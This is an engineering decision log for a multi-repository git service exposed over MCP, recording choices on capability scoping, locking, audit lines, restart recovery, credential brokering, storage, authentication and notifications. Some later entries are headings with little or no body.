Context: A `/redteam` finding observed that the design never said which ref the config is read from, and that `requiredChecks` defines what "green" means to the unwatched flow of item 13. Acting on it, this session added the `origin/<base>` read and a default exclusion of the config path from `writablePathPrefixes` — then discovered on verification that "Repository config is descriptive; no permission-ceiling mechanism" had already considered **both** guards and declined both, recorded verbatim as "No, none of that is needed, not today" and "Irrelevant now." That entry also names its own reopen condition: a permission-shaped field being *added* to repository config. No field was added, so the condition had not fired and the change had reversed a ratified decision without saying so.
Chosen: Revert both. Config is read from the working tree, as the prior art does; the cache is keyed by declaration and `HEAD` and invalidated when either moves. The exposure is restated in `10-design.md` as known and retained, pointing here rather than re-arguing it.
Rejected: **Keep the guards and supersede the earlier decision** — the recommended option, on the grounds that item 13's unwatched flow is a standing property a caller-authored gate defeats; not taken, and the earlier decision's own note already saw that reach and chose not to act. **Base ref for `requiredChecks` only** — targets the one field that matters, at the cost of a per-field source rule every future config consumer has to know.
Consequence: A branch can still alter which checks its own run waits for. That was true before this session and is true after it; what changed is only that the design now says so in the open rather than leaving it to be found.
Reversibility: cheap — both guards sit outside the config format, which is why the original decision could defer them without cost.
Note: The cache-invalidation rule is retained, since it is a correctness rule about stale reads rather than one of the two declined guards.
Superseded in part 2026-08-03 by "`RepositoryConfig` is read at point of use; the cache is dropped" above — there is no longer a cache to invalidate. **Both declined guards remain declined**, and the working-tree read is unchanged; only the caching decision moved.

### 2026-08-03 — Nine contained gaps closed together
Context: The same review found nine defects that were each a missing paragraph rather than a missing design: no exit from `attention`, lockout recovery present only as the word "break-glass", notifications dropped silently, reads racing eviction, `declaration.manage` described as a configurable default when the session model forbids it structurally, no retention policy for four append-only stores, no console CSRF or session lifecycle, a credential-failing mark with no clearing rule, and scheduled-job validation described as creation-only.
Chosen: Close all nine in one pass — `attention.resolve` and `auth.manage` capabilities with the three operator views that exercise them; recovery codes plus break-glass, stated as independent of each other and of the identity provider; failed outbox rows surfaced rather than dropped, and a notify-on-recovery rule; eviction gated on the active-operation count; structural rather than configurable phrasing for the operator-only capabilities; a retention table covering audit, journal, outbox and pre-migration backups; cookie, CSRF, timeout and logout rules in L5; a credential mark that clears on observed rotation or by hand; and fire-time plus boot-time job re-validation.
Rejected: **Defer them to `/contract` or `/slices`** — each is small enough to look deferrable, and together they are the difference between a design that survives its first incident and one that discovers its gaps during it.
Reversibility: cheap individually; the retention and revocation halves become migrations once data exists.

### 2026-08-03 — `git.raw` writes two audit lines
Context: The audit entry carries result kind and changed paths — post-execution facts — while the hatch was specified to refuse to run if its line could not be written, and the boundary table claimed no state left behind. One line cannot both precede execution and contain its result. An earlier edit the same day narrowed the durability claim but left this sequencing untouched.
Chosen: An intent line carrying the argument vector before the child process starts, and an outcome line carrying the result afterwards, correlated by `operationId`. Only the intent append can abort the call. A failed outcome append is a gap in the trail, not an unlogged execution, and the boundary table now says so.
Rejected: **One line written after execution** — keeps the entry shape, and forfeits the only property item 8 claims for the hatch. **One line written before, without the result** — preserves the refusal guarantee and makes the hatch the one operation whose outcome the audit trail never records.
Reversibility: cheap — a sequencing decision in one module.

### 2026-08-03 — `git.raw` redteam finding triaged: audit integrity is the defect, the rest is already claimed
Context: A `/redteam` pass by Codex filed one BLOCKING finding — that `git.raw` collapses the repository and authority boundaries, because command execution reached through git's extension points can touch a sibling clone, the structured store, the audit log, or another declaration's credential resolver, and pinning the working directory does not confine a child process. The execution premise is correct and the design already concedes it. What had to be settled was which of the named consequences the documents actually claim to prevent.
Chosen: STRUCTURAL, scoped to audit integrity. One consequence is a genuine defect: the boundary table claimed durable attributability for the hatch while the same hatch can rewrite the JSONL afterwards, which is a document contradicting itself rather than a risk the brief accepted. The claim is narrowed to refusal at call time, the reachable surface is now stated explicitly in `10-design.md` § The escape hatch's residual risk, and tamper-evidence becomes open question 5 — it wants answering before `/contract`, because the answer fixes the audit line format.
Rejected: **BLOCKING as filed** — would carry a blocking finding into `/contract`; rejected because the blast radius claimed rests on two boundaries the documents never asserted. **Per-declaration credential isolation as a violated boundary** — the brief defers this explicitly and claims only that a credential is not *given* to an operation outside its declaration, not that it cannot be reached, so reaching one via the hatch is inside what is claimed. **The no-cross-repository non-goal as a containment guarantee** — it is a scope statement about operations never being treated as one unit, not a security boundary. **Reopening the hard floor** — considered and declined in the ratified brief; a redteam finding does not reopen a brief decision. **Recording the triage without changing the design text** — leaves "pinned working directory" reading as more confinement than it delivers.
Reversibility: cheap for the wording; the tamper-evidence answer behind open question 5 is expensive once the audit format is written.

### 2026-08-03 — Capability authority is a four-layer lattice that only narrows
Context: The brief flagged build-time-versus-deploy-time locking as something `/design` must settle: `MCP-NEXT.md` fixes the contract at build time and fingerprints it, while the brief describes the lock as fixed at deploy time, per instance. A separate open item recorded that the prior art's per-consumer profiles and the brief's per-deployment lock are different granularities with an undesigned relationship.
Chosen: Four layers, each a subset of the one above — contract set (image build, fingerprinted), deployment ceiling (deploy configuration), declaration grant (runtime data, per repository), session grant (actor profile intersected with OAuth scopes). The effective set for any call is the intersection. No operation anywhere adds a capability to a set. Both timings are true because build time sets a maximum and every later layer only narrows.
Rejected: **Compile the contract per deployment** — makes the lock literally what the brief describes, and breaks the fingerprint, since a contract baked at build cannot enumerate repositories declared later. **Let deploy-time configuration widen what the image ships** — the obvious way to make one image serve differently-privileged deployments, and it destroys default-deny, because the running tool set would stop being a subset of the reviewed one. **Two unrelated mechanisms, one per-deployment and one per-consumer** — closest to the prior art, and it leaves the per-repository dimension with nowhere to live.
Reversibility: expensive — every enforcement point, the declaration format and the contract's capability field all sit on it.

### 2026-08-03 — MCP sessions are repository-scoped; the resource indicator is the repository
Context: `MCP-NEXT.md` §9.4 omits a tool from `tools/list` when the session lacks its capabilities, and §13 requires capability filtering to affect discovery and dispatch. With one instance serving many repositories and one listing per session, a per-repository grant could only be enforced at dispatch — weaker than the rule, and it forfeits the registration-is-the-boundary property that carries the prompt-injection threat model.
Chosen: An MCP session binds to exactly one declaration at `initialize`. The canonical MCP URI is `/mcp/{declarationId}`, so the OAuth resource indicator *is* the repository. Discovery and dispatch both filter on the full intersection. The operator console session is unscoped and spans every declaration, because it has to aggregate. The repository stays a required field in every tool's input schema on every surface.
Rejected: **Repository-agnostic sessions, repository as a parameter only** — simpler and identical to the HTTP surface; rejected because per-repository narrowing then reaches dispatch only. **An optional repository field defaulted from the session binding** — better agent ergonomics, and the input schema would mean different things on different surfaces. A scoped session that passes the wrong repository gets `authorization` instead.
Reversibility: expensive — it sets the MCP URI shape, the OAuth resource identifiers, and therefore every issued grant.
Consequence: This also settles the logged tension about per-declaration tool sets varying by host. A `generic` declaration's grant cannot contain `host.*` capabilities, so the host-specific tools are filtered out of that session's listing. The contract still fixes one tool list per image.

### 2026-08-03 — One composed image, one deployment
Context: The brief left deployment topology explicitly open, bearing on what "a common place" means and on what the console aggregates. The layered-image decision (base plus derived) reads naturally as one container per consumer.
Chosen: One composed image carrying every layer the operator wants, deployed once. One login, one console, one storage volume, one instance lock. Consumer tools and views ship in the image for every repository and are withheld per declaration by the capability lattice.
Rejected: **A base deployment plus one container per derived consumer** — cleaner separation of consumer code, and it produces two consoles, two logins and two URLs, which is the "no common place" problem the project exists to solve; it also fragments one-instance-many-repositories into one instance per consumer. **A base deployment plus an aggregating console above it** — preserves separation and keeps one surface, at the cost of building an aggregation layer whose only job is to undo the split.
Reversibility: expensive — the storage lock, the console's information architecture and the session model all assume a single owner.
Consequence: The blog consumer's ~16 authoring tools and its two views are present in the image for repositories they make no sense for. That cost is paid by the lattice rather than by a second mechanism, which is the reason the lattice covers views as well as tools.

### 2026-08-03 — The escape hatch is a capability inside the lock, not a bypass
Context: Two logged open items. Deployment-time locking and the hatch were unreconciled — either the hatch is a capability granted or withheld per deployment, or it sits outside the lock. And the hatch conflicts with the prior art's central property, that the tool surface itself is the safety boundary.
Chosen: `git.raw` is a declared tool in the contract requiring its own capability and scope. It is withholdable at deploy, per declaration and per session, and wherever withheld it is **not registered** — preserving registration-as-boundary for every session that lacks it. It refuses to run if its audit line cannot be written, since attributability is the only property the definition of done claims for it. It runs a fixed executable with an argument vector, no shell, pinned working directory, system and global git configuration disabled, and a neutral home.
Rejected: **The hatch sits outside the lattice** — the literal reading of "full git is reachable", and it gives the deployment lock an exception large enough to contain every operation the safety gate blocks. **A hard floor no surface can cross** — the most falsifiable guarantee, already considered and declined in the brief; recorded as known and retained, not re-litigated. **Restrict the hatch to the console** — also already declined in the brief; the operator can now reach that posture by configuration without the design mandating it.
Reversibility: cheap to tighten (withhold it), expensive to loosen once sessions hold grants naming it.
Known and retained: an argv-level git hatch remains reachable to command execution through git's own extension points. The design says so plainly rather than implying the constraints are sufficient.

### 2026-08-03 — Clones are an evictable cache with a safety interlock
Context: The brief left the storage policy to `/design` — evictable cache, retained until the operator intervenes, or a per-declaration cap — with repository count unbounded and the standing refusal that no clone holding uncommitted or unpushed work may be discarded.
Chosen: Evictable, LRU by last operation, gated by a safe-to-evict predicate recomputed at eviction time: clean tree and index, no branch ahead of its upstream, no commits unreachable from `origin/<base>`, no stash, no open journal entry, and not `pinned`. When nothing is safe to evict, the operation that needed the space is refused and names what is blocking it. The service never deletes to make room.
Rejected: **Retained until the operator intervenes** — never surprises anyone, and it turns unbounded repository count into a disk outage that arrives as a write error mid-operation. **A per-declaration size cap** — bounds total size predictably, and evicts by an arbitrary rule rather than by what is safe to lose.
Reversibility: cheap — the predicate and the trigger are separable, and pinning everything reproduces the retained policy.

### 2026-08-03 — Restart recovery is an intent journal, not state inference
Context: Definition-of-done item 14 requires that a restart mid-operation *recovers* rather than merely detecting that something was interrupted. The brief notes that this needs intent recorded before an operation acts, which nothing in the prior art does.
Chosen: A durable journal entry written under the mutation lock, before the first side effect, carrying pre-state and per-step progress. At boot, every entry not settled is re-classified against actual repository state as not-started, completed, or partial; partial either runs the operation's declared resume step or parks the declaration in `needs-attention` with mutations blocked. Failing to write the intent record aborts the operation.
Rejected: **Infer state at boot from the repository alone** — no new persistence, and it cannot distinguish "never started" from "half applied" for any operation whose first step is idempotent, which is most of them. **Detect and report only** — the prior art's behaviour, and explicitly what item 14 rules out.
Reversibility: expensive — every mutating operation acquires an obligation to declare pre-state capture and resume behaviour.
Note: recovery never discards work to reach a clean state. "Recovers" means deterministically classified and either resumed or safely parked.

### 2026-08-03 — stdio sessions own no storage; the instance lock is an advisory OS lock
Context: The brief requires an always-on container plus a short-lived process per stdio MCP session, "two lifecycles that must stay consistent with each other", and separately requires that two instances against one storage volume are prevented rather than discouraged, including after an unclean kill left a stale lock.
Chosen: The instance lock is an exclusive advisory OS lock held open on a lease file at the volume root for the process's lifetime; the kernel releases it on death including `SIGKILL`, so there is no stale lock to reason about. The lease contents are diagnostic — they name the holder in the refusal message. A stdio process is a thin transport proxying to the always-on instance over HTTP; it never opens the volume, never takes a lock and holds no clone.
Rejected: **A lease-timestamp file with a staleness threshold and no OS lock** — works across hosts, and it has to guess how long is too long, which is wrong in both directions. **Each stdio process opens the volume** — matches the prior art, and it is the second-instance case wearing a different hat: either it defeats the lock or the lock defeats it. **stdio gets its own volume** — no contention, and two divergent sets of clones and grants for the same repositories.
Reversibility: cheap for the lock, moderate for the stdio proxy.
Note: the advisory lock protects one host. A volume bind-mounted from two hosts is unprotected, which is the "no distributed or multi-node concurrency" non-goal restated where it bites.

### 2026-08-03 — Two lock classes with a fixed order; a bounded queue, not reject-on-contention
Context: Two live options were retained for `/design`: rejecting the second caller rather than queueing, and the earlier decision that mutations serialise globally while reads and waits do not. Definition-of-done item 5 additionally requires that a running instance clones a newly declared repository *while continuing to serve every other repository*, which a global lock held for a 300-second clone cannot do.
Chosen: A global mutation mutex covering working-tree, index, `HEAD`, ref, fetch and pull-request mutations, plus a per-declaration materialisation mutex covering the initial clone and eviction. Acquisition order is always materialisation before mutation, never the reverse, which is the whole deadlock argument. Contention on the mutation lock queues FIFO with a bounded wait and a bounded depth; exceeding either returns `conflict` naming the holding operation.
Rejected: **Reject the second caller immediately** — better for agents, which handle an explicit error more gracefully than a long block, and pure friction for the console's short bursts of quick mutations. The bounded queue is both. **One lock for everything including clones** — simplest failure model, and it makes item 5 unreachable. **Per-repository mutation locks** — the natural fit for one-instance-many-repositories, and it reverses the global-serialisation decision and makes the failure model several half-done operations rather than one.
Reversibility: cheap for the queue bounds, expensive for the lock classes.
Note: a lock-free read can observe a repository mid-mutation. Read results carry the last settled `operationId` and a `mutationInFlight` flag rather than being made atomic, because taking the lock to read reintroduces the blocking the exemption exists to avoid.

### 2026-08-03 — Declaration management is operator-only, behind a remote-host allowlist
Context: The brief names `repo_declare` as an example generic tool while a binding non-goal states that a caller can never hand the service a token or a repository URL at call time. A caller able to declare a repository could attach an existing credential reference to a remote it controls and harvest the token from the first push.
Chosen: Declaration management requires `declaration.manage`, which the deployment default withholds from every MCP session profile; it is reachable from the operator console and API. Independently, a declaration's clone URL host must be on a deployment-level remote-host allowlist, and each credential reference carries its own allowed-host constraint. Two independent guards, so the property does not rest on the capability alone.
Rejected: **Declaration tools exposed over MCP** — the symmetric reading of "one canonical domain service per operation", and it opens exactly the credential-redirection route the non-goal exists to close. **Declarations held only in deployment configuration** — closes it absolutely, and makes definition-of-done item 5 (onboard by declaration alone, no restart) unreachable.
Reversibility: cheap for the capability default, moderate for the allowlist.

### 2026-08-03 — Credential isolation is scoped lookup, not an enforced boundary
Context: Deferred by an earlier decision. One process holding every credential can deliver "not given to", not "cannot be reached", and the brief's wording was softened accordingly rather than left asserting something undelivered.
Chosen: A declaration names a credential *reference*, never a value. A broker resolves the reference at the moment of use, checks it against the target host, and hands the value only into a child process's environment by name, so it never appears in a process listing and never reaches a handler. The claim stays "not given to an operation outside its declaration".
Rejected: **A process or user boundary per declaration** — the only thing that makes "cannot be reached" true; rejected because it multiplies memory across an unbounded repository count and breaks the in-process global mutation mutex, which would then need a cross-process lock the non-goals exclude. **An external secret store fetched per operation** — strongest and keeps secrets out of the container entirely; retained as a live option and now narrowed to a resolver choice (see `10-design.md` open question 1). **One shared credential** — already rejected when per-declaration credentials were chosen.
Reversibility: moderate — the reference-and-resolver shape is what a later enforced boundary would slot into.

### 2026-08-03 — Structured state in SQLite; the audit log stays a separate append-only file
Context: The design needs atomic multi-row updates for journal classification, durable OAuth grants across restarts (definition-of-done item 12), declarations, clone metadata, scheduled jobs and a notification outbox. `MCP-NEXT.md` §12.2 already prefers SQLite for durable token storage unless a spike shows its container cost disproportionate. This is a new dependency and needs the alternatives named.
Chosen: SQLite on the named volume for structured state, with explicit forward-only migrations and a timestamped backup taken before each migration runs. The audit log stays JSONL on the volume, separate.
Rejected: **JSON files for everything** — no new dependency and matches the prior art's `schedule.json`; rejected because recovery classification and grant rotation need atomic multi-row updates that a write-temp-then-rename file cannot give. **SQLite for the audit log too** — one store to back up, and it makes the audit trail share a failure mode with the thing it audits. **An external database** — a deployment prerequisite the brief never asked for, against a single-operator container app.
Reversibility: expensive — the schema and the migration policy propagate into backup, restore and rollback procedure.
Note: forward-only migrations plus definition-of-done item 18's tested rollback are only compatible because of the pre-migration backup. Without it, rolling back the image cannot roll back the store.

### 2026-08-03 — One result envelope, widened to eight kinds, with a rule that generates `isError`
Context: The prior art's envelope has four kinds (`success`, `validation`, `precondition`, `infrastructure`) and sets `isError` only for `infrastructure`, because a gate correctly reporting three bad tags executed perfectly. `MCP-NEXT.md` §9.3 defines seven categories including `authorization`, `conflict`, `upstream` and `timeout`. Two vocabularies cannot both be the contract.
Chosen: One envelope, eight kinds, `isError` derived from a single rule — true when the failure is about the service or its dependencies (`upstream`, `timeout`, `infrastructure`), false when it is about the request or the repository state (`validation`, `precondition`, `conflict`, `authorization`). Token, audience and issuer failures never enter the envelope; they are transport-level `401` with a resource-metadata challenge, because the caller has to be told where to authenticate. Scope and capability failures at dispatch do produce an `authorization` envelope, and are audited.
Rejected: **Keep the prior art's four and map the rest onto them** — no migration for existing consumers, and it collapses distinctions the runtime pipeline needs to make. **Adopt §9.3's seven verbatim** — no reconciliation work, and it drops `success` and the `validation`-as-normal-result semantics that make the gate tools honest. **Per-kind `isError` decided case by case** — flexible, and it guarantees drift, because nobody can restate the rule from the table.
Reversibility: expensive — it is the client-visible shape of every result on every surface.

### 2026-08-03 — The scheduler holds one registry-named operation, not a publish
Context: The brief calls for the scheduler to be generalised into a hold-and-act mechanism taking the operation as a parameter, and calls it a redesign rather than a move. "The operation as a parameter" sits close to both the workflow-engine non-goal and the no-runtime-module-resolution rule.
Chosen: A job names one tool from the compiled registry, annotated schedulable, with input validated against that tool's schema at creation. It dispatches through the same pipeline as any caller under a scheduler actor profile. The creator's effective capability set is frozen on the job and re-intersected with the current grant at fire time, so a job can lose capability but never gain it. The prior art's explicit per-job missed-tick policy is inherited whole.
Rejected: **An ordered sequence of tools** — enough for stage/commit/push/PR/wait without becoming a language, and it is the flows layer the brief defers. **Keep a publish-shaped tool and parameterise it** — smallest change, and it carries the blog's shape into the generic surface, which is the coupling this extraction exists to remove. **Re-derive capability at fire time only** — simpler, and it lets a job created under a narrow grant execute under a later wider one.
Reversibility: cheap.

### 2026-08-03 — Console extension via a versioned package consumed at the derived build
Context: Logged as deferred to `/design`. Extension happens at image build, but the console is a separate frontend project and a bundle must be built to gain routes.
Chosen: The base publishes its console as a versioned package — sources, view-registration types, build entry. The derived image's build consumes it and produces the bundle. The bundle's asset manifest is hashed into a console fingerprint, separate from the contract fingerprint; both are verified at startup and reported by the version endpoint, and a mismatch is fatal. A registered view declares the capabilities it needs and renders for a selected repository only when that repository's grant contains them.
Rejected: **A prebuilt bundle that discovers views at runtime** — no consumer build step, and it puts the UI outside anything fingerprinted, defeating the reason image-build extension was chosen. **The derived image rebuilds from base sources copied out of the base image** — no extra publishing step, and no version pinning and no type checking across the seam. **The consumer forks the base console** — nothing to maintain across the seam, and every base improvement becomes a merge.
Reversibility: expensive — an extension seam is hard to retrofit, and this one is also a published package boundary.

### 2026-08-03 — `gh` kept, behind a host-adapter interface
Context: Retained as a live option by an earlier decision, which noted the unbounded-targets decision would force the question. Roughly a third of the generic tool set is GitHub-shaped.
Chosen: One host-adapter interface with a single implementation, GitHub via `gh`, isolated in one module. A declaration states its host; `generic` gets local git only and no `host.*` capabilities. A per-credential request budget with jittered backoff sits in front of the adapter, because unbounded repositories multiplied by polling monitors reaches the host's rate limits before disk becomes binding.
Rejected: **Call GitHub's REST and GraphQL APIs directly** — one less binary in the image and honest for a GitHub-only feature set; rejected because parity against captured fixtures is a definition-of-done item and swapping the host client during that migration adds risk with no stated benefit. The interface keeps the swap additive. **A host abstraction proven against a second implementation** — the only thing that makes "no assumptions about host" fully true, and materially the largest option with no second host in evidence.
Reversibility: cheap — the interface is the seam, and the prior art already isolates `gh` in one module.

### 2026-08-03 — Federation is OIDC with a subject allowlist; TOTP recovery is codes plus volume break-glass
Context: The brief requires one operator identity provable two ways, federation over "one standard protocol with a configurable issuer", and enforced TOTP with a working lockout-recovery path and no second operator to let you back in. A logged open item noted that an external provider will happily assert many identities and something must reduce that to one authorised subject.
Chosen: OIDC as the protocol, matching `MCP-NEXT.md` §5.4's preferred external-authorization-server mode. The deployment configures an issuer and an allowlist of acceptable subject claims, all of which map to the single operator identity — many credentials, one identity. Recovery is single-use codes generated at enrolment and stored hashed with the remaining count reported, plus an out-of-band break-glass: a one-time reset token placed in the storage volume by whoever has host access, consumed at next login and audited.
Rejected: **SAML** — broader enterprise reach, and a second protocol family alongside the OAuth the service already speaks in both directions. **Accept any subject the configured issuer asserts** — simplest, and it makes the identity provider's user list the service's; a single-operator system with an implicit multi-user door. **Recovery codes alone** — no host-access dependency, and it fails exactly the case item 10 names: codes lost along with the authenticator.
Reversibility: cheap for the allowlist, expensive for the protocol.
Note: break-glass reduces recovery to volume access, which is the operator's real root of trust. That is stated rather than hidden — anyone who can write to the volume can already replace the image.

### 2026-08-03 — Outbound notification is a webhook-first outbox on terminal states
Context: The brief reopened outbound notifications as in scope with the mechanism undecided, on the grounds that an unwatched run stopping at a terminal state must be able to reach the operator, otherwise "unwatched" means "unnoticed".
Chosen: A notifier module behind one port with a single shipped transport — an HTTP webhook POST to an operator-configured URL — fired on terminal states an unwatched caller cannot see: merge conflict, failed required check, wait timeout, recovery parked in `needs-attention`, and eviction refused for disk pressure. Delivery goes through a durable outbox with bounded retry, never blocks the operation it describes, and logs on exhaustion.
Rejected: **Email first** — reaches the operator without another service, and it needs SMTP configuration and carries deliverability failure modes that are themselves silent. **An MCP server-initiated notification to the connected client** — no extra transport, and no client is guaranteed connected, which is the definition of unwatched. **No notifier, rely on the console** — smallest, and it makes item 13's standing property depend on the operator looking.
Reversibility: cheap — one port, one adapter.

### 2026-08-03 — `.gitattributes` pins LF; `core.autocrlf` overridden per repository
Context: Every commit warned "LF will be replaced by CRLF the next time Git touches it". `core.autocrlf` is `true` on the primary Windows host, so checkouts would carry CRLF while the house convention in `AGENTS.md` is LF. This project ships a container with an entrypoint script, and a shell script checked out with CRLF fails inside a Linux container with a bad-interpreter error naming neither the script nor the line endings.
Chosen: `* text=auto eol=lf` in `.gitattributes`, plus explicit `binary` for raster and archive types. One file, effective on every host and every clone regardless of local git configuration.
Rejected: **Force LF for scripts only** — narrower, and it leaves two rules to remember whenever a new file type appears. **Defer until the first script exists** — which is exactly when someone is already debugging a container that will not start. **Set `core.autocrlf=input` globally on the host** — fixes every repository at once and silently changes behaviour for the other twelve in the estate.
Reversibility: cheap, though a later change would rewrite the working tree of every clone.

### 2026-08-03 — Tool renaming is a clean break at cutover, no aliases

### 2026-08-03 — Deliverable 1 is new construction; `MCP-NEXT.md` is a plan, not a codebase
Context: `/brief-check` found the brief asserting "both are extractions of working code, not new invention" while `MCP-NEXT.md` opens with "Status: proposed; no behavior described in this document is implemented until the corresponding phase is merged and validated." The contract, compiler, registry, fingerprint, adapters and resource server do not exist anywhere.

### 2026-08-03 — The mutex covers mutations only, not reads or waits
Context: The brief said "one operation at a time, globally across all repositories". `blog-mcp` serialises repo-mutating calls only — `blog_diff` and every read tier run outside the mutex — and every `wait_*` tool caps at 1800 seconds. Under the literal reading a single CI wait would hold every repository for up to half an hour.

### 2026-08-03 — Any host for local git; pull-request tooling is GitHub-only

### 2026-08-03 — Each managed repository carries its own endpoint configuration

### 2026-08-03 — Repository config is descriptive; no permission-ceiling mechanism
Context: A concern was raised that repository-controlled config confers authority by commit — an actor able to write the file widens its own permissions. ### 2026-08-03 — Workflow sequencing moves server-side as transactional composites
Context: The publishing sequence currently runs in the browser — `ComposeView` calls `/api/branch`, `/api/posts`, `/api/stage`, `/api/commit`, `/api/push`, `/api/pr` in order. `TODO-NEXT.md` §7.1 records the resulting incident (a commit stranded on `main` when branch creation re-based from `origin/main`) and §7.3 prescribes replacing client orchestration with one transactional preparation tool.

### 2026-08-03 — One operator identity; local credentials plus pluggable auth providers

### 2026-08-03 — Credentials are per-declaration and isolated

### 2026-08-03 — One instance serves many repositories; `blog-mcp`'s one-repo-per-container model dropped

### 2026-08-03 — Globally serialised by an in-process lock; "no locking" retracted
Context: An earlier interview answer made "no queue, no locking, no contention handling" a binding non-goal. Reading `blog-mcp/src/exec/repoLock.ts` contradicted it: that lock exists because the UI, external MCP clients and the scheduler share one working tree and one HEAD, and without it concurrent branch switches corrupt HEAD and `git add` hits `index.lock`. This project has the same three surfaces, and now serves many repositories from one process.
Chosen: One operation at a time, globally across all repositories, enforced by an in-process lock. `blog-mcp`'s promise-chain queue is the precedent. The non-goal narrows to distributed and multi-node concurrency.
Rejected: **Genuinely no lock** — the reference's own comments record that this corrupts HEAD in practice. **Reject the second caller rather than queue** — arguably better for agent callers, which handle an explicit error better than a long blocking wait; retained as a live option for `/design`. **Per-repo locks with parallel operation across repositories** — the natural fit for one-instance-many-repos and the most capable; rejected to keep the failure model at exactly one half-done operation.
Reversibility: cheap to tighten, expensive to loosen — the serial assumption will spread through the workflow layer.
Note: The retracted non-goal was a category error worth naming. One-operation-at-a-time is the *outcome a lock produces*, not the absence of one.
